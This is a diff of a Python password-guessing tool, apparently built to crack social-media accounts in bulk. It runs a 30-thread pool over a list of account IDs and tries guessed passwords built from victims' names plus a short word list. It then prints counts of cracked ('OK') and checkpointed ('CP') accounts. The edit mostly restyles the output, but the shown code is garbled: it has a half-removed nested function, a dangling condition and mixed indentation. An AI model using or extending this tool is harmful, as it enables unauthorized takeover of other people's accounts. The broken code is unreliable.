@@ -498,20 +498,9 @@ def setting():
 	print(f'{N}│')
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
+ 
 def passwrd():
-	KAKTARANI(f'{N}│ ╭───────────────────────────────────────────────────────╮\n{N}│ │ [{h}•{x}] KAKTARANI {h}OK{x} SAVE IN : {h}%s{x}  {N}│'%(okc))
-	KAKTARANI(f'{N}│ │ [{k}•{x}] KAKTARANI {k}CP{x} SAVE IN : {k}%s{x}  {N}│'%(cpc))
-	KAKTARANI(f'{N}│ ╰────────[{k}✨ON/OF AIRPLANE MODE EVERY 500 ID✨{N}]─────────╯') #%(okc,cpc))
-	KAKTARANI(f"│")
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = ['bagong','sayang','kontol','bangsat']
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-			def passwrd():
+    os.system('clear')
     print(logo)
     print(f"\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mUSER NAME\033[1;91m :\033[1;96m "+uname)
     print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93mTODAY'S DATE :\033[1;92m "+date)
@@ -579,17 +568,14 @@ def passwrd():
                 pool.submit(crackfree,idf,pwv)
             else:
                 pool.submit(crackfree,idf,pwv)
-	print(f'{N}╭───[{b}•{x}]{h} OK : {h}%s '%(ok))
-	print(f'{N}├───{x}[{b}•{x}]{k} CP : {k}%s{x} '%(cp))
-	print('│')
-	print(f'├───[{b}•{x}] Crack Again ( Y/t ) ? ')
-	woi = input(f'╰───[{b}•{x}] Pilih : ')
-	if woi in ['y','Y']:
-		back()
-	else:
-		print(f'\t{x}  {N}[{k} Gimana Udah Bersyukur Blum ]{x} ')
-		time.sleep(2)
-		exit()
+    print('\n\033[1;37m===================================')
+    print('\033[97;1m[\033[92;1m+\033[97;1m] Crack Tawaw Buu :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(ok))
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(cp))
+    print('\n\033[1;37m===================================')
+    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
+    os.system("python V2.py")
+    exit()
 #--------------------[ METODE-B-API ]-----------------#
 def crackmobile_KAKTARANI(idf,pwv,nmf):
 	global loop,ok,cp
